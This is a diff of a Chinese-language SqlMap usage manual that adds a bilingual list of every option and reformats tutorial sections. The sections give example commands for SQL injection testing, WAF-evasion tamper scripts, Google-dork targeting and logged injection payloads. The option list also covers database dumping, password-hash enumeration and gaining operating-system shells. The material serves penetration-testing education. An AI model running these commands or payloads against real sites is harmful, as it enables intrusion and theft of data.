@@ -17,6 +17,440 @@ excerpt: 整理的一份非常完整的SqlMap使用手册，几乎完全覆盖Sq
 
 ---
 
+## 0. 参数详解
+
+```bash
+Usage: python sqlmap.py [options]
+
+Options（选项）:
+
+-h, --help Show basic help message and exit 展示帮助文档 参数
+
+-hh Show advanced help message and exit 展示详细帮助文档参数
+
+--version Show program's version number and exit 显示程序的版本号
+
+-v VERBOSE Verbosity level: 0-6 (default 1) 详细级别：0-6（默认为1）
+
+Target（目标）:
+
+At least one of these options has to be provided to define the target(s)
+
+-d DIRECT Connection string for direct database connection 指定具体数据库
+
+-u URL, --url=URL Target URL (e.g. "http://www.site.com/vuln.php?id=1")目标URL
+
+-l LOGFILE Parse target(s) from Burp or WebScarab proxy log file 解析目标(s)从Burp或WebScarab代理日志文件
+
+-x SITEMAPURL Parse target(s) from remote sitemap(.xml) file 解析目标(s)从远程站点地图文件(.xml)
+
+-m BULKFILE Scan multiple targets given in a textual file 扫描文本文件中给出的多个目标
+
+-r REQUESTFILE Load HTTP request from a file 从本地文件加载HTTP请求 ，多用于post注入。
+
+-g GOOGLEDORK Process Google dork results as target URLs 处理Google的结果作为目标URL。
+
+-c CONFIGFILE Load options from a configuration INI file 从INI配置文件中加载选项。
+
+Request（请求）:
+
+These options can be used to specify how to connect to the target URL 这些选项可以用来指定如何连接到目标URL。
+
+--method=METHOD Force usage of given HTTP method (e.g. PUT) 强制使用给定的HTTP方法（e.g. PUT）
+
+--data=DATA Data string to be sent through POST 通过POST发送的数据字符串
+
+--param-del=PARA.. Character used for splitting parameter values 用于拆分参数值的字符
+
+--cookie=COOKIE HTTP Cookie header value HTTP Cookie头的值
+
+--cookie-del=COO.. Character used for splitting cookie values 用于分割Cookie值的字符
+
+--load-cookies=L.. File containing cookies in Netscape/wget format包含Netscape / wget格式的cookie的文件
+
+--drop-set-cookie Ignore Set-Cookie header from response从响应中忽略Set-Cookie头
+
+--user-agent=AGENT HTTP User-Agent header value指定 HTTP User - Agent头
+
+--random-agent Use randomly selected HTTP User-Agent header value 使用随机选定的HTTP User - Agent头
+
+--host=HOST HTTP Host header value HTTP主机头值
+
+--referer=REFERER HTTP Referer header value 指定 HTTP Referer头
+
+-H HEADER, --hea.. Extra header (e.g. "X-Forwarded-For: 127.0.0.1")额外header
+
+--headers=HEADERS Extra headers (e.g. "Accept-Language: fr\\nETag: 123")额外header
+
+--auth-type=AUTH.. HTTP authentication type (Basic, Digest, NTLM or PKI)HTTP 认证类型(Basic, Digest, NTLM or PKI)
+
+--auth-cred=AUTH.. HTTP authentication credentials (name:password) HTTP认证凭证(name:password)
+
+--auth-file=AUTH.. HTTP authentication PEM cert/private key file HTTP认证 PEM认证/私钥文件
+
+--ignore-401 Ignore HTTP Error 401 (Unauthorized)忽略HTTP错误401
+
+--proxy=PROXY Use a proxy to connect to the target URL 使用代理连接到目标网址
+
+--proxy-cred=PRO.. Proxy authentication credentials (name:password)代理认证证书(name:password)
+
+--proxy-file=PRO.. Load proxy list from a file 从文件中加载代理列表
+
+--ignore-proxy Ignore system default proxy settings 忽略系统默认代理设置
+
+--tor Use Tor anonymity network 使用Tor匿名网络
+
+--tor-port=TORPORT Set Tor proxy port other than default 设置Tor代理端口而不是默认值
+
+--tor-type=TORTYPE Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)设置Tor代理类型
+
+--check-tor Check to see if Tor is used properly 检查Tor是否正确使用
+
+--delay=DELAY Delay in seconds between each HTTP request每个HTTP请求之间的延迟（秒）
+
+--timeout=TIMEOUT Seconds to wait before timeout connection (default 30) 秒超时连接前等待（默认30）
+
+--retries=RETRIES Retries when the connection timeouts (default 3) 连接超时时重试（默认值3）
+
+--randomize=RPARAM Randomly change value for given parameter(s)随机更改给定参数的值(s)
+
+--safe-url=SAFEURL URL address to visit frequently during testing在测试期间频繁访问的URL地址
+
+--safe-post=SAFE.. POST data to send to a safe URLPOST数据发送到安全URL
+
+--safe-req=SAFER.. Load safe HTTP request from a file从文件加载安全HTTP请求
+
+--safe-freq=SAFE.. Test requests between two visits to a given safe URL在两次访问给定安全网址之间测试请求
+
+--skip-urlencode Skip URL encoding of payload data 跳过有效载荷数据的URL编码
+
+--csrf-token=CSR.. Parameter used to hold anti-CSRF token参数用于保存anti-CSRF令牌
+
+--csrf-url=CSRFURL URL address to visit to extract anti-CSRF token提取anti-CSRF URL地址访问令牌
+
+--force-ssl Force usage of SSL/HTTPS 强制使用SSL /HTTPS
+
+--hpp Use HTTP parameter pollution method使用HTTP参数pollution的方法
+
+--eval=EVALCODE Evaluate provided Python code before the request (e.g. 评估请求之前提供Python代码"import hashlib;id2=hashlib.md5(id).hexdigest()")
+
+Optimization（优化）:
+
+These options can be used to optimize the performance of sqlmap 这些选项可用于优化sqlmap的性能
+
+-o Turn on all optimization switches 开启所有优化开关
+
+--predict-output Predict common queries output 预测常见的查询输出
+
+--keep-alive Use persistent HTTP(s) connections使用持久的HTTP（S）连接
+
+--null-connection Retrieve page length without actual HTTP response body 从没有实际的HTTP响应体中检索页面长度
+
+--threads=THREADS Max number of concurrent HTTP(s) requests (default 1)最大的HTTP（S）请求并发量（默认为1）
+
+Injection（注入）:
+
+These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts 这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
+
+-p TESTPARAMETER Testable parameter(s) 可测试的参数（S）
+
+--skip=SKIP Skip testing for given parameter(s)跳过对给定参数的测试
+
+--skip-static Skip testing parameters that not appear to be dynamic 跳过测试不显示为动态的参数
+
+--param-exclude=.. Regexp to exclude parameters from testing (e.g. "ses")
+使用正则表达式排除参数进行测试（e.g. "ses"）
+
+--dbms=DBMS Force back-end DBMS to this value 强制后端的DBMS为此值
+
+--dbms-cred=DBMS.. DBMS authentication credentials (user:password)DBMS认证凭证(user:password)
+
+--os=OS Force back-end DBMS operating system to this value 强制后端的DBMS操作系统为这个值
+
+--invalid-bignum Use big numbers for invalidating values 使用大数字使值无效
+
+--invalid-logical Use logical operations for invalidating values使用逻辑操作使值无效
+
+--invalid-string Use random strings for invalidating values使用随机字符串使值无效
+
+--no-cast Turn off payload casting mechanism 关闭有效载荷铸造机制
+
+--no-escape Turn off string escaping mechanism 关闭字符串转义机制
+
+--prefix=PREFIX Injection payload prefix string 注入payload字符串前缀
+
+--suffix=SUFFIX Injection payload suffix string 注入payload字符串后缀
+
+--tamper=TAMPER Use given script(s) for tampering injection data使用给定的脚本（S）篡改注入数据
+
+Detection（检测）:
+These options can be used to customize the detection phase 这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
+
+--level=LEVEL Level of tests to perform (1-5, default 1) 执行测试的等级（1-5，默认为1）
+
+--risk=RISK Risk of tests to perform (1-3, default 1)执行测试的风险（0-3，默认为1）
+
+--string=STRING String to match when query is evaluated to True 查询时有效时在页面匹配字符串
+
+--not-string=NOT.. String to match when query is evaluated to False 当查询求值为无效时匹配的字符串
+
+--regexp=REGEXP Regexp to match when query is evaluated to True 查询时有效时在页面匹配正则表达式
+
+--code=CODE HTTP code to match when query is evaluated to True 当查询求值为True时匹配的HTTP代码
+
+--text-only Compare pages based only on the textual content 仅基于在文本内容比较网页
+
+--titles Compare pages based only on their titles 仅根据他们的标题进行比较
+
+Techniques（技巧）:
+These options can be used to tweak testing of specific SQL injection techniques 这些选项可用于调整具体的SQL注入测试。
+
+--technique=TECH SQL injection techniques to use (default "BEUSTQ") SQL 注入技术测试（默认BEUST）
+
+--time-sec=TIMESEC Seconds to delay the DBMS response (default 5) DBMS响应的延迟时间（默认为5秒）
+
+--union-cols=UCOLS Range of columns to test for UNION query SQL injection 定列范围用于测试UNION查询注入
+
+--union-char=UCHAR Character to use for bruteforcing number of columns 用于暴力猜解列数的字符
+
+--union-from=UFROM Table to use in FROM part of UNION query SQL injection  要在UNION查询SQL注入的FROM部分使用的表
+
+--dns-domain=DNS.. Domain name used for DNS exfiltration attack 域名用于DNS漏出攻击
+
+--second-order=S.. Resulting page URL searched for second-order response 生成页面的URL搜索为second-order响应
+
+Fingerprint（指纹）:
+
+-f, --fingerprint Perform an extensive DBMS version fingerprint 执行检查广泛的DBMS版本指纹
+
+Enumeration（枚举）:
+
+These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements
+这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。
+
+-a, --all Retrieve everything 检索一切
+
+-b, --banner Retrieve DBMS banner 检索数据库管理系统的标识
+
+--current-user Retrieve DBMS current user 检索数据库管理系统的 标识
+
+--current-db Retrieve DBMS current database 检索数据库管理系统当前数据库
+
+-hostname Retrieve DBMS server hostname 检索数据库服务器的主机名
+
+--is-dba Detect if the DBMS current user is DBA检测DBMS当前用户是否DBA
+
+--users Enumerate DBMS users 枚举数据库管理系统用户
+
+--passwords Enumerate DBMS users password hashes 枚举数据库管理系统用户密码哈希
+
+--privileges Enumerate DBMS users privileges 枚举数据库管理系统用户的权限
+
+--roles Enumerate DBMS users roles 枚举数据库管理系统用户的角色
+
+--dbs Enumerate DBMS databases 枚举数据库管理系统数据库
+
+--tables Enumerate DBMS database tables 枚举的DBMS数据库中的表
+
+--columns Enumerate DBMS database table columns枚举DBMS数据
+库表列
+
+--schema Enumerate DBMS schema 枚举数据库架构
+
+--count Retrieve number of entries for table(s) 检索表的条目数
+
+--dump Dump DBMS database table entries 转储数据库管理系统的数据库中的表项
+
+--dump-all Dump all DBMS databases tables entries转储数据库管理系统的数据库中的表项
+
+--search Search column(s), table(s) and/or database name(s) 搜索列（S），表（S）和/或数据库名称（S）
+
+--comments Retrieve DBMS comments 检索数据库的comments(注释、评论)
+
+-D DB DBMS database to enumerate 要进行枚举的数据库名
+
+-T TBL DBMS database table(s) to enumerate 要进行枚举的数据库表
+
+-C COL DBMS database table column(s) to enumerate要进行枚举的数据库列
+
+-X EXCLUDECOL DBMS database table column(s) to not enumerate要不进行枚举的数据库列
+
+-U USER DBMS user to enumerate 用来进行枚举的数据库用户
+
+--exclude-sysdbs Exclude DBMS system databases when enumerating tables 枚举表时排除系统数据库
+
+--pivot-column=P.. Pivot column name 主列名称
+
+--where=DUMPWHERE Use WHERE condition while table dumping使
+用WHERE条件进行表转储
+
+--start=LIMITSTART First query output entry to retrieve 第一个查询输出进入检索
+
+--stop=LIMITSTOP Last query output entry to retrieve最后查询的
+输出进入检索
+
+--first=FIRSTCHAR First query output word character to retrieve第一个查询输出字的字符检索
+
+--last=LASTCHAR Last query output word character to retrieve最后查询的输出字字符检索
+
+--sql-query=QUERY SQL statement to be executed要执行的SQL语句
+
+--sql-shell
+Prompt for an interactive SQL shell提示交互式SQL的shell
+
+--sql-file=SQLFILE Execute SQL statements from given file(s)从给定文件执行SQL语句
+
+Brute force（蛮力）:
+
+These options can be used to run brute force checks这些选项可以被用来运行蛮力检查。
+
+--common-tables Check existence of common tables检查存在共同表
+
+--common-columns Check existence of common columns 检查存在共同列
+
+User-defined function injection（用户自定义函数注入）:
+
+These options can be used to create custom user-defined functions 这些选项可以用来创建用户自定义函数。
+
+--udf-inject Inject custom user-defined functions 注入用户自定义函数
+
+--shared-lib=SHLIB Local path of the shared library 共享库的本地路径
+
+File system access（访问文件系统）:
+These options can be used to access the back-end database management system underlying file system 这些选项可以被用来访问后端数据库管理系统的底层文件系统。
+
+--file-read=RFILE Read a file from the back-end DBMS file system 从后端的数据库管理系统文件系统读取文件
+
+--file-write=WFILE Write a local file on the back-end DBMS file system编辑后端的数据库管理系统文件系统上的本地文件
+
+--file-dest=DFILE Back-end DBMS absolute filepath to write to 后端的数据库管理系统写入文件的绝对路径
+
+Operating system access（操作系统访问）:
+
+These options can be used to access the back-end database management system underlying operating system 这些选项可以用于访问后端数据库管理系统的底层操作系统。
+
+--os-cmd=OSCMD Execute an operating system command 执行操作系统命令
+
+--os-shell Prompt for an interactive operating system shell 交互式的操作系统的shell
+
+--os-pwn
+Prompt for an OOB shell, Meterpreter or VNC获取一个OOB shell，meterpreter或VNC
+
+--os-smbrelay One click prompt for an OOB shell, Meterpreter or VNC 一键获取一个OOB shell，meterpreter或VNC
+
+--os-bof Stored procedure buffer overflow exploitation 存储过程缓冲区溢出利用
+
+--priv-esc Database process user privilege escalation 数据库进程用户权限提升
+
+--msf-path=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework本地的安装路径
+
+--tmp-path=TMPPATH Remote absolute path of temporary files directory 远程临时文件目录的绝对路径
+
+Windows registry access（Windows注册表访问）:
+
+These options can be used to access the back-end database management system Windows registry 这些选项可以被用来访问后端数据库管理系统Windows注册表。
+
+--reg-read Read a Windows registry key value 读一个Windows注册表项值
+
+--reg-add Write a Windows registry key value data 写一个Windows注册表项值数据
+
+--reg-del Delete a Windows registry key value 删除Windows注册表键值
+
+--reg-key=REGKEY Windows registry key Windows注册表键
+
+--reg-value=REGVAL Windows registry key value Windows注册表项值
+
+--reg-data=REGDATA Windows registry key value data Windows注册表键值数据
+
+--reg-type=REGTYPE Windows registry key value type Windows注册表项值类型
+
+General（一般）:
+
+These options can be used to set some general working parameters 这些选项可以用来设置一些一般的工作参数。
+
+-s SESSIONFILE Load session from a stored (.sqlite) file 保存和恢复检索会话文件的所有数据
+
+-t TRAFFICFILE Log all HTTP traffic into a textual file 记录所有HTTP流量到一个文本文件中
+
+--batch Never ask for user input, use the default behaviour 从不询问用户输入，使用所有默认配置。
+
+--binary-fields=.. Result fields having binary values (e.g. "digest")具有二进制值的结果字段
+
+--charset=CHARSET Force character encoding used for data retrieval强制用于数据检索的字符编码
+
+--crawl=CRAWLDEPTH Crawl the website starting from the target URL 从目标网址开始抓取网站
+
+--crawl-exclude=.. Regexp to exclude pages from crawling (e.g. "logout")正则表达式排除网页抓取
+
+--csv-del=CSVDEL Delimiting character used in CSV output (default ",") 分隔CSV输出中使用的字符
+
+--dump-format=DU.. Format of dumped data (CSV (default), HTML or SQLITE)转储数据的格式
+
+--eta Display for each output the estimated time of arrival 显示每个输出的预计到达时间
+
+--flush-session Flush session files for current target刷新当前目标的会话文件
+
+--forms Parse and test forms on target URL 在目标网址上解析和测试表单
+
+--fresh-queries Ignore query results stored in session file 忽略在会话文件中存储的查询结果
+
+--hex Use DBMS hex function(s) for data retrieval 使用DBMS hex函数进行数据检索
+
+--output-dir=OUT.. Custom output directory path 自定义输出目录路径
+
+--parse-errors Parse and display DBMS error messages from responses解析和显示响应中的DBMS错误消息
+
+--save=SAVECONFIG Save options to a configuration INI file保存选项到INI配置文件
+
+--scope=SCOPE Regexp to filter targets from provided proxy log 使用正则表达式从提供的代理日志中过滤目标
+
+--test-filter=TE.. Select tests by payloads and/or titles (e.g. ROW)根据有效负载和/或标题(e.g. ROW)选择测试
+
+--test-skip=TEST.. Skip tests by payloads and/or titles (e.g. BENCHMARK)根据有效负载和/或标题跳过测试（e.g. BENCHMARK）
+
+--update Update sqlmap 更新SqlMap
+
+Miscellaneous（杂项）:
+
+-z MNEMONICS Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
+使用简短的助记符
+
+--alert=ALERT Run host OS command(s) when SQL injection is found 在找到SQL注入时运行主机操作系统命令
+
+--answers=ANSWERS Set question answers (e.g. "quit=N,follow=N") 设置问题答案
+
+--beep Beep on question and/or when SQL injection is found 发现SQL 注入时提醒
+
+--cleanup Clean up the DBMS from sqlmap specific UDF and tables SqlMap具体的UDF和表清理DBMS
+
+--dependencies Check for missing (non-core) sqlmap dependencies 检查是否缺少（非内核）sqlmap依赖关系
+
+--disable-coloring Disable console output coloring 禁用控制台输出颜色
+
+--gpage=GOOGLEPAGE Use Google dork results from specified page number 使用Google dork结果指定页码
+
+--identify-waf Make a thorough testing for a WAF/IPS/IDS protection 对WAF / IPS / IDS保护进行全面测试
+
+--skip-waf Skip heuristic detection of WAF/IPS/IDS protection 跳过启发式检测WAF / IPS / IDS保护
+
+--mobile Imitate smartphone through HTTP User-Agent header 通过HTTP User-Agent标头模仿智能手机
+
+--offline Work in offline mode (only use session data) 在离线模式下工作（仅使用会话数据）
+
+--page-rank Display page rank (PR) for Google dork results Google dork结果显示网页排名（PR）
+
+--purge-output Safely remove all content from output directory 安全地从输出目录中删除所有内容
+
+--smart Conduct thorough tests only if positive heuristic(s) 只有在正启发式时才进行彻底测试
+
+--sqlmap-shell Prompt for an interactive sqlmap shell提示交互式 sqlmap shell
+
+--wizard Simple wizard interface for beginner users 给初级用户的简单向导界面
+```
+
+
+
+
 
 ## 1.一些基础知识
 
@@ -90,8 +524,8 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 	python sqlmap.py --update
 或者
 ​	
-	git pull
-----
+
+​	git pull
 
 ## 2.参数讲解
 
@@ -104,17 +538,17 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 
 
 	0.只显示python错误以及严重的信息。
-
+	
 	1.同时显示基本信息和警告信息。（默认）
-
+	
 	2.同时显示debug信息。
-
+	
 	3.同时显示注入的payload。
-
+	
 	4.同时显示HTTP请求。
-
+	
 	5.同时显示HTTP响应头。
-
+	
 	6.同时显示HTTP响应页面。
 
 如果你想看到sqlmap发送的测试payload最好的等级就是3。
@@ -126,27 +560,27 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### 从指定url中获得
 
 	参数：-u或者--url
-
+	
 	格式：http(s)://targeturl[:port]/[…]
-
+	
 	例如：python sqlmap.py -u "http://www.target.com/test.php?id=1" -f --banner --dbs --users
 
 #### 从Burp或者WebScarab代理中获取日志
 
 	参数：-l
-
+	
 	可以直接把Burp proxy或者WebScarab proxy中的日志直接导出来交给sqlmap来一个一个检测是否有注入。
 
 #### 从文本中获取多个目标扫描
 
 	参数：-m
-
+	
 	文件中保存url格式如下，sqlmap会一个一个检测
-
+	
 	www.target1.com/vuln1.php?q=foobar
-
+	
 	www.target2.com/vuln2.asp?id=1
-
+	
 	www.target3.com/vuln3/id/1*
 	从文件中加载HTTP请求
 	
@@ -166,11 +600,11 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### 处理Google的搜索结果
 
 	参数：-g
-
+	
 	sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。
-
+	
 	例子：
-
+	
 	python sqlmap.py -g "inurl:\".php?id=1\""
 
 
@@ -182,46 +616,46 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### http数据
 
 	参数：--data
-
+	
 	此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。
-
+	
 	例子：
-
+	
 	python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users
 #### 参数拆分字符
 
 	参数：--param-del
-
+	
 	当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。
-
+	
 	例子：
-
+	
 	python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users
 
 #### HTTP cookie头
 
 	参数：--cookie,--load-cookies,--drop-set-cookie
-
+	
 	这个参数在以下两个方面很有用：
-
+	
 	1、web应用需要登陆的时候。
-
+	
 	2、你想要在这些头参数中测试SQL注入时。
-
+	
 	可以通过抓包把cookie获取到，复制出来，然后加到--cookie参数里。
-
+	
 	在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。
-
+	
 	如果你不想接受Set-Cookie可以使用--drop-set-cookie参数来拒接。
-
+	
 	当你使用--cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当--level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。
 
 #### HTTP User-Agent头
 
 	参数：--user-agent,--random-agent
-
+	
 	默认情况下sqlmap的HTTP请求头中User-Agent值是：
-
+	
 	sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
 	可以使用--user-agent参数来修改，同时也可以使用--random-agent参数来随机的从./txt/user-agents.txt中获取。
 	
@@ -230,78 +664,78 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### HTTP Referer头
 
 	参数：--referer
-
+	
 	sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。
 
 #### 额外的HTTP头
 
 	参数：--headers
-
+	
 	可以通过--headers参数来增加额外的http头
 
 #### HTTP认证保护
 
 	参数：--auth-type,--auth-cred
-
+	
 	这些参数可以用来登陆HTTP的认证保护支持三种方式：
-
+	
 	1、Basic
-
+	
 	2、Digest
-
+	
 	3、NTLM
-
+	
 	例子：
-
+	
 	python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
 #### HTTP协议的证书认证
 
 	参数：--auth-cert
-
+	
 	当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。
-
+	
 	key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。
 
 #### HTTP(S)代理
 
 	参数：--proxy,--proxy-cred和--ignore-proxy
-
+	
 	使用--proxy代理是格式为：http://url:port。
-
+	
 	当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。
-
+	
 	--ignore-proxy拒绝使用本地局域网的HTTP(S)代理。
 
 #### HTTP请求延迟
 
 	参数：--delay
-
+	
 	可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。
 
 #### 设定超时时间
 
 	参数：--timeout
-
+	
 	可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。
 
 #### 设定重试超时
 
 	参数：--retries
-
+	
 	当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。
 
 #### 设定随机改变的参数值
 
 	参数：--randomize
-
+	
 	可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。
 
 #### 利用正则过滤目标网址
 
 	参数：--scope
-
+	
 	例如：
-
+	
 	python sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
 	避免过多的错误请求被屏蔽
 	
@@ -317,17 +751,17 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### 关掉URL参数值编码
 
 	参数：--skip-urlencode
-
+	
 	根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用--skip-urlencode参数。
 
 #### 每次请求时候执行自定义的python代码
 
 	参数：--eval
-
+	
 	在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用--eval参数在每次请求时根据所写python代码做完修改后请求。
-
+	
 	例子：
-
+	
 	python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
 	上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。
 
@@ -338,54 +772,54 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### 测试参数
 
 	参数：-p,--skip
-
+	
 	sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候,也会测试HTTP Cookie头的值.当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p "id,user-anget"
-
+	
 	当你使用--level的值很大,但是有个别参数不想测试的时候可以使用--skip参数。
-
+	
 	例如：--skip="user-angent.referer"
-
+	
 	在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*
-
+	
 	例如：
-
+	
 	python sqlmap.py -u "http://targeturl/param1/value1*/param2/value2/"
 	sqlmap将会测试value1的位置是否可注入。
 
 #### 指定数据库
 
 	参数：--dbms
-
+	
 	默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：
-
+	
 	MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2
 
 #### 指定数据库服务器系统
 
 	参数：--os
-
+	
 	默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。
 
 #### 指定无效的大数字
 
 	参数：--invalid-bignum
-
+	
 	当你想指定一个报错的数值时，可以使用这个参数，例如默认情况系id=13，sqlmap会变成id=-13来报错，你可以指定比如id=9999999来报错。
 
 #### 指定无效的逻辑
 
 	参数：--invalid-logical
-
+	
 	原因同上，可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19。
 
 #### 注入payload
 
 	参数：--prefix,--suffix
-
+	
 	在有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。
-
+	
 	例如，代码中是这样调用数据库的：
-
+	
 	$query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1";
 	这时你就需要--prefix和--suffix参数了：
 	
@@ -397,79 +831,79 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### 修改注入的数据
 
 	参数：--tamper
-
+	
 	sqlmap除了使用CHAR()函数来防止出现单引号之外没有对注入的数据修改，你可以使用--tamper参数对数据做修改来绕过WAF等设备。
 
 下面是一个tamper脚本的格式：
 
 	＃ Needed imports
-
+	
 	from lib.core.enums import PRIORITY
-
+	
 	＃ Define which is the order of application of tamper scripts against
-
+	
 	＃ the payload
-
+	
 	__priority__ = PRIORITY.NORMAL
-
+	
 	def tamper(payload):
-
-    	'''
-
-    	Description of your tamper script
-
-    	'''
-
-    	retVal = payload
-
-    	# your code to tamper the original payload
-
-    	# return the tampered payload
-
-    	return retVal
+	
+		'''
+	
+		Description of your tamper script
+	
+		'''
+	
+		retVal = payload
+	
+		# your code to tamper the original payload
+	
+		# return the tampered payload
+	
+		return retVal
 ​    
 
 可以查看 tamper/ 目录下的有哪些可用的脚本
 例如：
 
 	$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
-
+	
 	[hh:mm:03] [DEBUG] cleaning up configuration parameters
-
+	
 	[hh:mm:03] [INFO] loading tamper script 'between'
-
+	
 	[hh:mm:03] [INFO] loading tamper script 'randomcase'
-
+	
 	[hh:mm:03] [INFO] loading tamper script 'space2comment'
-
+	
 	[...]
-
+	
 	[hh:mm:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-
+	
 	[hh:mm:04] [PAYLOAD] 1)/**/And/**/1369=7706/**/And/**/(4092=4092
-
+	
 	[hh:mm:04] [PAYLOAD] 1)/**/AND/**/9267=9267/**/AND/**/(4057=4057
-
+	
 	[hh:mm:04] [PAYLOAD] 1/**/AnD/**/950=7041
-
+	
 	[...]
-
+	
 	[hh:mm:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
-
+	
 	[hh:mm:04] [PAYLOAD] 1/**/anD/**/(SELeCt/**/9921/**/fROm(SELeCt/**/counT(*),CONCAT(cHar(
-
+	
 	58,117,113,107,58),(SELeCt/**/(case/**/whEN/**/(9921=9921)/**/THeN/**/1/**/elsE/**/0/**/
-
+	
 	ENd)),cHar(58,106,104,104,58),FLOOR(RanD(0)*2))x/**/fROm/**/information_schema.tables/**/
-
+	
 	group/**/bY/**/x)a)
-
+	
 	[hh:mm:04] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING
-
+	
 	clause' injectable
-
+	
 	[...]
-
+	
 	sqlmap_intro_secpulse
 
 
@@ -478,27 +912,27 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### 探测等级
 
 	参数：--level
-
+	
 	共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。
-
+	
 	这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。
-
+	
 	总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。
 
 #### 风险等级
 
 	参数：--risk
-
+	
 	共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。
-
+	
 	在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。
-
+	
 	测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。
 
 #### 页面比较
 
 	参数：--string,--not-string,--regexp,--code
-
+	
 	默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用--string参数添加字符串，--regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（--not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200。
 
 #### 参数：--text-only,--titles
@@ -510,11 +944,11 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### 测试是否是注入
 
 	参数：--technique
-
+	
 	这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。
-
+	
 	支持的探测方式如下：
-
+	
 	B: Boolean-based blind SQL injection（布尔型注入）
 	E: Error-based SQL injection（报错型注入）
 	U: UNION query SQL injection（可联合查询注入）
@@ -524,25 +958,25 @@ http://unconciousmind.blogspot.com/search/label/sqlmap
 #### 设定延迟注入的时间
 
 	参数：--time-sec
-
+	
 	当使用继续时间的盲注时，时刻使用--time-sec参数设定延时时间，默认是5秒。
 
 #### 设定UNION查询字段数
 
 	参数：--union-cols
-
+	
